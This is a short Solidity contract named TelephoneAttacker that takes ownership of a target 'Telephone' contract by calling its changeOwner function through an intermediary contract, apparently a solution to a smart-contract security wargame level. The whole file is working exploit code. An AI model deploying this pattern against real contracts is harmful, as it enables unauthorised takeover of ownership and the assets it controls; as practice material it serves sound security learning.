pragma solidity ^0.6.0;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}



contract TelephoneAttacker {

    TelephoneInterface tele;

    constructor(address _addr) public {
        tele = TelephoneInterface(_addr);
    }

    function attack(address _owner) public {
        tele.changeOwner(_owner);
    }

}
